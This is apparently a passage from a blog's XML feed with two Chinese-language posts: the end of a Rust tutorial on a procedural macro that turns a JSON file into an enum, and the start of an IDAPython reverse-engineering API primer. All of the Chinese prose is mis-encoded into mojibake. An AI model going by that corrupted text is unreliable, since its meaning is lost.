å¯ä»¥ç»™enumï¼Œstructå•¥çš„å®ç°æŸä¸ªç‰¹å¾ï¼Œ ä½¿ç”¨æ–¹æ³•æ¯”å¦‚ï¼š <code>#[derive(Debug)] struct DebugStruct;</code>ï¼Œ æ¯”å¦‚ <code>proc_macro_attribute</code> å¯ä»¥æ‰©å±•å‡½æ•°ï¼Œenumå­—æ®µç­‰çš„åŠŸèƒ½ã€‚</p><p>è€Œè¿™é‡Œç”±äºæˆ‘ä»¬è¿enuméƒ½è¦æ´¾ç”Ÿï¼Œä¸Šé¢è¯´çš„ä¸¤è€…éƒ½è¦ä¾æ‰˜äºæŸä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä¹Ÿå°±é‡‡ç”¨<code>proc_macro</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[proc_macro]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">json_to_enum</span>(input: TokenStream) <span class="punctuation">-&gt;</span> TokenStream &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input</span> = parse_macro_input!(input <span class="keyword">as</span> DeriveInput);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">gen</span> = quote! &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line">    gen.<span class="title function_ invoke__">into</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦å…ˆè§£æä¸€ä¸ªattributeï¼Œå¾—åˆ°jsonæ–‡ä»¶çš„è·¯å¾„ï¼Œæ¯”å¦‚è¿™ä¸ªattributeæ˜¯ <code>#[from_json(&quot;test.json&quot;)]</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç”±äºå¯ä»¥æœ‰å¾ˆå¤šä¸ªattributeï¼Œæ‰€ä»¥è¿™é‡Œè¿”å›çš„æ˜¯ä¸€ä¸ªVec</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">attribute</span> = &amp;input.attrs;</span><br><span class="line"><span class="comment">// è§£æå‡ºattré‡Œæä¾›çš„jsonæ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">json_name</span> = attribute</span><br><span class="line">.<span class="title function_ invoke__">iter</span>()</span><br><span class="line">.<span class="title function_ invoke__">find_map</span>(|attr| &#123;</span><br><span class="line">        <span class="keyword">if</span> attr.<span class="title function_ invoke__">path</span>().<span class="title function_ invoke__">is_ident</span>(<span class="string">&quot;from_json&quot;</span>) &#123;</span><br><span class="line">            <span class="comment">// å°è¯•æŠŠattrè§£ææˆå­—é¢é‡(literal)</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">lit</span> = <span class="keyword">match</span> attr.parse_args::&lt;Lit&gt;() &#123;</span><br><span class="line">                <span class="title function_ invoke__">Ok</span>(lit) =&gt; lit,</span><br><span class="line">                <span class="title function_ invoke__">Err</span>(e) =&gt; <span class="built_in">panic!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, e),</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Lit</span>::<span class="title function_ invoke__">Str</span>(lit) = lit &#123;</span><br><span class="line">                <span class="title function_ invoke__">Some</span>(lit.<span class="title function_ invoke__">value</span>())</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="literal">None</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="comment">// è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">json_content</span> = std::fs::<span class="title function_ invoke__">read_to_string</span>(json_name).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;file not found&quot;</span>);</span><br><span class="line"><span class="comment">// è§£ææ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">json</span>: serde_json::Value = serde_json::<span class="title function_ invoke__">from_str</span>(&amp;json_content).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;json parse error&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åè·å–ä½ ä¼ å…¥çš„enumçš„åå­—ï¼ˆæ ‡è¯†ç¬¦ï¼‰ï¼Œå’Œjsonçš„keyså°±å¯ä»¥æ´¾ç”Ÿenumäº†</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">name</span> = &amp;input.ident;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">variants</span> = json</span><br><span class="line">    .<span class="title function_ invoke__">as_object</span>()</span><br><span class="line">    .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;json should be object&quot;</span>)</span><br><span class="line">    .<span class="title function_ invoke__">keys</span>()</span><br><span class="line">    .<span class="title function_ invoke__">map</span>(|k| &#123;</span><br><span class="line">        <span class="comment">// jsoné‡Œé¢æ˜¯snakeå‘½åï¼Œè½¬æˆé©¼å³°å¼å‘½å</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">ident</span> = Ident::<span class="title function_ invoke__">new</span>(&amp;<span class="title function_ invoke__">snake_to_camel</span>(k), Span::<span class="title function_ invoke__">call_site</span>().<span class="title function_ invoke__">into</span>());</span><br><span class="line">        quote! &#123;</span><br><span class="line">            #ident,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™å°±å¯ä»¥åƒè¿™æ ·æ´¾ç”Ÿä¸€ä¸ªenum</p><p>æ˜¯ä¸æ˜¯æ„Ÿè§‰å’Œå†™<code>macro_rules!</code>å¾ˆåƒå‘¢</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">quote! &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">enum</span> #name &#123;</span><br><span class="line">        *(#variants)*</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿˜è¦å®ç°ä¸€ä¸‹Displayï¼Œéœ€æ±‚è¯´çš„æ˜¯è¦jsonå­—æ®µå¯¹åº”çš„å€¼ï¼ˆä¹Ÿå°±æ˜¯é‚£äº›ä¸­æ–‡ï¼‰ï¼Œè¿™ä¹Ÿæ˜¾ç„¶åªè¦è·å–jsonçš„valueså³å¯</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">msgs</span> = json.<span class="title function_ invoke__">as_object</span>().<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">values</span>().<span class="title function_ invoke__">map</span>(|v| &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">msg</span> = v.<span class="title function_ invoke__">as_str</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;value should be string&quot;</span>);</span><br><span class="line">        quote! &#123;</span><br><span class="line">            #msg</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>åé¢å®ç°Displayï¼Œï¼ˆæˆ‘ä¹Ÿé¡ºä¾¿å®ç°äº†Debugï¼‰ä¹Ÿå°±è·Ÿä¸Šé¢ä¸€æ ·</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">std</span>::fmt::Display <span class="keyword">for</span> #name &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> std::fmt::Formatter) <span class="punctuation">-&gt;</span> std::fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            #(</span><br><span class="line">                #name::#keys =&gt; <span class="built_in">write!</span>(f, <span class="string">&quot;&#123;&#125;&quot;</span>, <span class="built_in">stringify!</span>(#msgs)),</span><br><span class="line">            )*</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œå°±å·²ç»å®Œæˆäº†ï¼Œå¦‚æœä½ ä¸çŸ¥é“åé¢è¿™éƒ¨åˆ†æ€ä¹ˆå¼„å°±å¥½å¥½ç†è§£ä¸€ä¸‹å‰é¢çš„ä»£ç ï¼Œæˆ‘æ•…æ„æ²¡æœ‰å…¨éƒ½å†™å‡ºæ¥ï¼ˆï¼‰</p><p>å®ç°å®Œåè®°å¾—æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> json_to_enum_macro::json_to_enum;</span><br><span class="line"></span><br><span class="line">json_to_enum! &#123;</span><br><span class="line">    <span class="meta">#[from_json(<span class="string">&quot;test.json&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Test</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = Test::AppNameNotSet;</span><br><span class="line">    <span class="built_in">assert_eq!</span>(a.<span class="title function_ invoke__">to_string</span>(), <span class="string">&quot;åº”ç”¨åç§°æœªè®¾ç½®&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>èƒ½æ­£å¸¸è·‘å°±åŸºæœ¬æ²¡å•¥é—®é¢˜äº†ï¼Œè¿˜æ‹…å¿ƒå°±å±•å¼€çœ‹çœ‹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo expand</span><br></pre></td></tr></table></figure><p>å±•å¼€ç»“æœï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#![feature(prelude_import)]</span></span><br><span class="line"><span class="meta">#[prelude_import]</span></span><br><span class="line"><span class="keyword">use</span> std::prelude::rust_2021::*;</span><br><span class="line"><span class="meta">#[macro_use]</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> std;</span><br><span class="line"><span class="keyword">use</span> parser_macro::json_to_enum;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    AppNameAlreadyExists,</span><br><span class="line">    AppNameInvalid,</span><br><span class="line">    AppNameNotSet,</span><br><span class="line">    AppNameTooLong,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">std</span>::fmt::Display <span class="keyword">for</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> std::fmt::Formatter) <span class="punctuation">-&gt;</span> std::fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            Test::AppNameAlreadyExists =&gt; &#123;</span><br><span class="line">                f.<span class="title function_ invoke__">write_fmt</span>(</span><br><span class="line">                    <span class="built_in">format_args!</span>(</span><br><span class="line">                        <span class="string">&quot;&#123;0&#125;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;\&quot;\u&#123;5e94&#125;\u&#123;7528&#125;\u&#123;540d&#125;\u&#123;79f0&#125;\u&#123;5df2&#125;\u&#123;5b58&#125;\u&#123;5728&#125;\&quot;&quot;</span>,</span><br><span class="line">                    ),</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">            Test::AppNameInvalid =&gt; &#123;</span><br><span class="line">                f.<span class="title function_ invoke__">write_fmt</span>(</span><br><span class="line">                    <span class="built_in">format_args!</span>(</span><br><span class="line">                        <span class="string">&quot;&#123;0&#125;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;\&quot;\u&#123;5e94&#125;\u&#123;7528&#125;\u&#123;540d&#125;\u&#123;79f0&#125;\u&#123;65e0&#125;\u&#123;6548&#125;\&quot;&quot;</span>,</span><br><span class="line">                    ),</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">            Test::AppNameNotSet =&gt; &#123;</span><br><span class="line">                f.<span class="title function_ invoke__">write_fmt</span>(</span><br><span class="line">                    <span class="built_in">format_args!</span>(</span><br><span class="line">                        <span class="string">&quot;&#123;0&#125;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;\&quot;\u&#123;5e94&#125;\u&#123;7528&#125;\u&#123;540d&#125;\u&#123;79f0&#125;\u&#123;672a&#125;\u&#123;8bbe&#125;\u&#123;7f6e&#125;\&quot;&quot;</span>,</span><br><span class="line">                    ),</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">            Test::AppNameTooLong =&gt; &#123;</span><br><span class="line">                f.<span class="title function_ invoke__">write_fmt</span>(</span><br><span class="line">                    <span class="built_in">format_args!</span>(</span><br><span class="line">                        <span class="string">&quot;&#123;0&#125;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;\&quot;\u&#123;5e94&#125;\u&#123;7528&#125;\u&#123;540d&#125;\u&#123;79f0&#125;\u&#123;8fc7&#125;\u&#123;957f&#125;\&quot;&quot;</span>,</span><br><span class="line">                    ),</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">std</span>::fmt::<span class="built_in">Debug</span> <span class="keyword">for</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> std::fmt::Formatter) <span class="punctuation">-&gt;</span> std::fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            Test::AppNameAlreadyExists =&gt; &#123;</span><br><span class="line">                f.<span class="title function_ invoke__">write_fmt</span>(<span class="built_in">format_args!</span>(<span class="string">&quot;&#123;0&#125;&quot;</span>, <span class="string">&quot;AppNameAlreadyExists&quot;</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            Test::AppNameInvalid =&gt; f.<span class="title function_ invoke__">write_fmt</span>(<span class="built_in">format_args!</span>(<span class="string">&quot;&#123;0&#125;&quot;</span>, <span class="string">&quot;AppNameInvalid&quot;</span>)),</span><br><span class="line">            Test::AppNameNotSet =&gt; f.<span class="title function_ invoke__">write_fmt</span>(<span class="built_in">format_args!</span>(<span class="string">&quot;&#123;0&#125;&quot;</span>, <span class="string">&quot;AppNameNotSet&quot;</span>)),</span><br><span class="line">            Test::AppNameTooLong =&gt; f.<span class="title function_ invoke__">write_fmt</span>(<span class="built_in">format_args!</span>(<span class="string">&quot;&#123;0&#125;&quot;</span>, <span class="string">&quot;AppNameTooLong&quot;</span>)),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = Test::AppNameNotSet;</span><br><span class="line">    <span class="title function_ invoke__">match</span> (&amp;a.<span class="title function_ invoke__">to_string</span>(), &amp;<span class="string">&quot;åº”ç”¨åç§°æœªè®¾ç½®&quot;</span>) &#123;</span><br><span class="line">        (left_val, right_val) =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> !(*left_val == *right_val) &#123;</span><br><span class="line">                <span class="keyword">let</span> <span class="variable">kind</span> = ::core::panicking::AssertKind::<span class="built_in">Eq</span>;</span><br><span class="line">                ::core::panicking::<span class="title function_ invoke__">assert_failed</span>(</span><br><span class="line">                    kind,</span><br><span class="line">                    &amp;*left_val,</span><br><span class="line">                    &amp;*right_val,</span><br><span class="line">                    ::core::option::<span class="type">Option</span>::<span class="literal">None</span>,</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idapythonå…¥é—¨</title>
      <link href="/idapython%E5%85%A5%E9%97%A8/"/>
      <url>/idapython%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA-Pythonå…¥é—¨ï¼ˆtodoï¼‰"><a href="#IDA-Pythonå…¥é—¨ï¼ˆtodoï¼‰" class="headerlink" title="IDA Pythonå…¥é—¨ï¼ˆtodoï¼‰"></a>IDA Pythonå…¥é—¨ï¼ˆtodoï¼‰</h1><p>ida pro7.7å·²ç»åŸºæœ¬æ™®åŠäº†ï¼Œæ‰€ä»¥æœ¬ç¯‡æ–‡ç« æ˜¯åŸºäºida pro77å’Œpython3ç¯å¢ƒç¼–å†™ã€‚</p><p>ä¸å¯å¦è®¤çš„æ˜¯ida proåœ¨é™æ€åˆ†æä¸Šæä¸ºå¼ºå¤§ï¼Œä¸è¿‡åŠ¨è°ƒæ–¹é¢è¿˜æ˜¯æ¯”èµ·å…¶ä»–å·¥å…·ç¨æ˜¾ä¸è¶³ï¼Œè€Œidapythonæä¾›äº†å¤§é‡çš„idaçš„apiï¼Œèƒ½ä¸€å®šç¨‹åº¦ä¸Šç¼“è§£åŠ¨è°ƒçš„ç¼ºé™·ï¼Œè¿™é‡Œå°±ç»™å¤§å®¶ç®€å•ä»‹ç»ä¸€ä¸‹ï¼ˆ</p><p><em><strong>PSï¼šå‚è€ƒäº†Qç¥çš„ <a href="http://www.qfrost.com/posts/ctf/idapython">http://www.qfrost.com/posts/ctf/idapython</a> ï¼Œå¹¶ä¸”ä¿®æ­£ä¸ºäº†æ–°ç‰ˆida pythonçš„api</strong></em></p><span id="more"></span><p><img src="/idapython%E5%85%A5%E9%97%A8/image-20240223213616667.png" alt="image-20240223213616667"></p><p><img src="/idapython%E5%85%A5%E9%97%A8/image-20240223221902702.png" alt="image-20240223221902702"></p><p><strong>æŒ‡ä»¤ç›¸å…³ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_dbg <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># è¿”å›ç›®æ ‡åœ°å€æŒ‡å‘çš„æŒ‡ä»¤çš„å‰ä¸€æ¡æŒ‡ä»¤çš„åœ°å€</span></span><br><span class="line"><span class="comment"># å‚æ•°ä¸€æ˜¯æŸ¥æ‰¾çš„å¼€å§‹åœ°å€ï¼Œå‚æ•°äºŒæ˜¯å¾€å‰æŸ¥æ‰¾çš„æœ€å°åœ°å€ï¼ˆåœ¨èŒƒå›´å†…ï¼‰</span></span><br><span class="line">prev_1 = prev_head(<span class="number">0x00007FF6A1AA2577</span>, <span class="number">1</span>)</span><br><span class="line">prev_2 = prev_head(<span class="number">0x00007FF6A1AA257a</span>, <span class="number">0x00007FF6A1AA2578</span>)<span class="comment"># fail</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(prev_1), <span class="built_in">hex</span>(prev_2))</span><br><span class="line">&gt;&gt; <span class="number">0x7ff6a1aa2573</span> <span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›ç›®æ ‡åœ°å€æŒ‡å‘çš„æŒ‡ä»¤çš„åä¸€æ¡æŒ‡ä»¤çš„åœ°å€</span></span><br><span class="line"><span class="comment"># å‚æ•°ä¸€æ˜¯æŸ¥æ‰¾å¼€å§‹åœ°å€ï¼Œå‚æ•°äºŒæ˜¯å¾€åæŸ¥æ‰¾çš„æœ€å¤§åœ°å€ï¼ˆä¸åœ¨èŒƒå›´å†…ï¼‰</span></span><br><span class="line">next_1 = next_head(<span class="number">0x00007FF6A1AA257a</span>, <span class="number">1</span>)<span class="comment"># fail</span></span><br><span class="line">next_2 = next_head(<span class="number">0x00007FF6A1AA257a</span>, <span class="number">0x00007FF6A1AA2580</span>)</span><br><span class="line">&gt;&gt; <span class="number">0xffffffffffffffff</span> <span class="number">0x7ff6a1aa257b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç›®æ ‡åœ°å€çš„åæ±‡ç¼–è¯­å¥ï¼ˆå°±æ˜¯æœ‰ä¸€ç‚¹ç‚¹ä¹±ç xï¼‰</span></span><br><span class="line">a = generate_disasm_line(<span class="number">0x00007FF6A1AA2585</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt; <span class="string">b&#x27;\x01\x05movzx\x02\x05   \x01)\x01!eax\x02!\x02)\x01\t,\x02\t \x01*\x01 byte ptr\x02  \x01\t[\x02\t\x01!r10\x02!\x01\t]\x02\t\x02*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç›®æ ‡åœ°å€æŒ‡ä»¤</span></span><br><span class="line">a = print_insn_mnem(<span class="number">0x00007FF6A1AA2585</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt; movzx</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç›®æ ‡åœ°å€çš„æŸä¸ªæ“ä½œæ•°ï¼ˆæŒ‰ç´¢å¼•å–ï¼‰</span></span><br><span class="line">a = print_operand(<span class="number">0x00007FF6A1AA2585</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt; <span class="string">b&#x27;\x01)\x01!eax\x02!\x02)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç›®æ ‡åœ°å€æŸä¸ªæ“ä½œæ•°çš„å€¼ï¼ˆæŒ‰ç´¢å¼•å–ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_operand_value(<span class="number">0x00007FF6A1AA2577</span>, <span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(get_operand_value(<span class="number">0x00007FF6A1AA2577</span>, <span class="number">1</span>)))</span><br><span class="line">&gt;&gt; <span class="number">0x10</span></span><br><span class="line">&gt;&gt; &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç›®æ ‡åœ°å€å­—ç¬¦ä¸²ï¼Œå‚æ•°äºŒæ˜¯é•¿åº¦ï¼Œå‚æ•°ä¸‰æ˜¯stringçš„ç±»å‹</span></span><br><span class="line">a = get_strlit_contents(<span class="number">0x00007FF6A1AC28A8</span>, <span class="number">4</span>, <span class="number">0</span>)</span><br><span class="line">b = get_strlit_contents(<span class="number">0x00007FF6A1AC28A8</span>, <span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">&gt;&gt; <span class="string">b&#x27;Erro&#x27;</span></span><br><span class="line">&gt;&gt; <span class="string">b&#x27;\xe7\x89\x85\xe6\xbd\xb2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨ç›®æ ‡åœ°å€æ·»åŠ æ³¨é‡Šï¼Œå‚æ•°ä¸‰ä¸ºTrueåˆ™ä¸ä¼šæ›¿æ¢comment</span></span><br><span class="line">a = set_cmt(<span class="number">0x00007FF6A1AA2577</span>, <span class="string">&quot;this is a comment&quot;</span>, <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt; <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»™ç›®æ ‡åœ°å€çš„å˜é‡æ”¹å</span></span><br><span class="line">a = set_name(<span class="number">0x00007FF6A1AC28A8</span>, <span class="string">&quot;err&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt; <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰å…‰æ ‡å¤„åœ°å€</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_screen_ea()))</span><br><span class="line">&gt;&gt; <span class="number">0x7ff6a1ac28a8</span></span><br><span 